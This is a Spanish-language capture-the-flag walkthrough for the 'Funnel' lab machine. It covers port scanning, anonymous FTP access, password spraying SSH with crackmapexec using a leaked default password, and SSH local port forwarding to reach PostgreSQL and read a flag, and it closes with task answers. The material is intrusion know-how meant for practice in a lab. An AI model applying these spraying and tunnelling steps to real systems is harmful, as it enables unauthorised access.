# Funnel

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **FTP (File Transfer Protocol):** Es un protocolo de red utilizado para transferir archivos entre sistemas a través de una red TCP/IP. Aunque es ampliamente utilizado, FTP no cifra la información que se transmite, lo que lo convierte en un objetivo fácil para los atacantes que interceptan el tráfico en redes no seguras, lo que puede dar lugar al robo de archivos o credenciales.
  * **PostgreSQL:** Es un sistema de gestión de bases de datos relacional de código abierto, conocido por su estabilidad y rendimiento. Sin embargo, si no se configura adecuadamente o se dejan configuraciones por defecto, puede ser vulnerable a ataques como la inyección SQL, el acceso no autorizado a bases de datos o la ejecución de comandos maliciosos en el servidor.
  * **Reconnaissance (Reconocimiento):** Es la fase inicial de las pruebas de penetración, donde se recopila información detallada sobre el objetivo. Esto incluye escaneo de puertos, identificación de servicios, descubrimiento de posibles vulnerabilidades y análisis de la infraestructura. El reconocimiento permite a los atacantes identificar los puntos débiles que pueden ser explotados.
  * **Tunneling (Tunelización):** Es una técnica que permite a los atacantes o administradores de red establecer una conexión segura entre dos sistemas a través de una red no segura. Esto se logra encapsulando paquetes de datos dentro de otros, lo que permite eludir las restricciones de firewall o de red. Los atacantes pueden usar túneles para acceder a sistemas protegidos o para ocultar su tráfico.
  * **Password Spraying (Rociado de Contraseñas):** Es un tipo de ataque de fuerza bruta en el que un atacante intenta un número limitado de contraseñas comunes en muchas cuentas diferentes, en lugar de intentar adivinar la contraseña de una sola cuenta. Este ataque es efectivo cuando las contraseñas comunes no se han cambiado y puede ser más difícil de detectar que un ataque tradicional de fuerza bruta.
  * **Port Forwarding (Redirección de Puertos):** Es un proceso mediante el cual se reenvía el tráfico de una red a un puerto específico de un servidor dentro de una red privada. Esta técnica es utilizada por los atacantes para acceder a servicios internos de una red desde fuera, explotando configuraciones de red incorrectas o mal implementadas.
  * **Anonymous/Guest Access (Acceso Anónimo/Acceso de Invitado):** Se refiere a permitir que los usuarios se conecten a sistemas o servicios sin autenticarse, o con privilegios mínimos. Aunque puede ser útil para la accesibilidad, también representa un riesgo de seguridad, ya que los atacantes pueden aprovechar estas cuentas para obtener acceso no autorizado a sistemas sensibles.
  * **Clear Text Credentials (Credenciales en Texto Claro):** Son credenciales de acceso (como nombres de usuario y contraseñas) que se transmiten sin cifrar, lo que significa que pueden ser interceptadas fácilmente en una red. El uso de credenciales en texto claro es una vulnerabilidad grave, ya que cualquier atacante con acceso al tráfico de red puede robarlas y acceder a los sistemas protegidos.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.224.43
```

<figure><img src="../../../.gitbook/assets/image (1192).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -sCV -Pn 10.129.224.43
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.&#x20;

<figure><img src="../../../.gitbook/assets/image (1193).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo, el puerto **21** perteneciente al servicio **FTP** y el puerto **22** correspondiente a **SSH** están abiertos. A continuación, se indagará más sobre estos servicios.

Como podemos loguearnos con el usuario **Anonymous** vamos a ello.

```bash
ftp 10.129.224.43
```

Nos descargamos los archivos pertinentes.

<figure><img src="../../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>

Vemos su contenido.

```bash
xdg-open password_policy.pdf
```

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-13 193627.png" alt=""><figcaption></figcaption></figure>

Tenemos una contraseña. Revisamos el otro archivo.

<figure><img src="../../../.gitbook/assets/image (1195).png" alt=""><figcaption></figcaption></figure>

Hay varios posibles usuarios por lo que creamos un diccionario con ellos para realizar fuerza bruta.

```bash
crackmapexec ssh 10.129.224.43 -u users.txt -p 'funnel123#!#'
```

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

Iniciamos sesión.

```bash
ssh christine@10.129.224.43
```

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

Para redirigir la instancia de PostgreSQL a tu máquina local, utilizamos el siguiente comando SSH:

```bash
ssh -L 1234:localhost:5432 christine@10.129.224.43
```

En otra instancia.

```bash
psql -U christine -h localhost -p 1234
```

Listamos databases.

```bash
\l
```

<figure><img src="../../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>

Nos conectamos a **secrets**.

```bash
\c secrets
```

<figure><img src="../../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>

### 5. 🔑 **Captura de la Flag**

Seleccionamos la flag.

```bash
SELECT * FROM flag;
```

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-13 201812.png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

**Task 1**\
&#xNAN;**¿Cuántos puertos TCP están abiertos?**\
🔹 **Respuesta:** `2`

**Task 2**\
&#xNAN;**¿Cuál es el nombre del directorio disponible en el servidor FTP?**\
🔹 **Respuesta:** `mail_backup`

**Task 3**\
&#xNAN;**¿Cuál es la contraseña predeterminada que todo nuevo miembro del equipo "Funnel" debe cambiar lo antes posible?**\
🔹 **Respuesta:** `funnel123#!#`

**Task 4**\
&#xNAN;**¿Qué usuario no ha cambiado su contraseña predeterminada aún?**\
🔹 **Respuesta:** `christine`

**Task 5**\
&#xNAN;**¿Qué servicio se está ejecutando en el puerto TCP 5432 y solo escucha en localhost?**\
🔹 **Respuesta:** `PostgreSQL`

**Task 6**\
**Dado que no puedes acceder al servicio mencionado desde la máquina local, debes crear un túnel y conectarte a él desde tu máquina. ¿Cuál es el tipo correcto de túnel a utilizar? ¿Reenvío de puerto remoto o reenvío de puerto local?**\
🔹 **Respuesta:** `local port forwarding`

**Task 7**\
&#xNAN;**¿Cuál es el nombre de la base de datos que contiene la flag?**\
🔹 **Respuesta:** `secrets`

**Task 8**\
&#xNAN;**¿Podrías usar un túnel dinámico en lugar de un reenvío de puerto local? Sí o No.**\
🔹 **Respuesta:** `Sí`
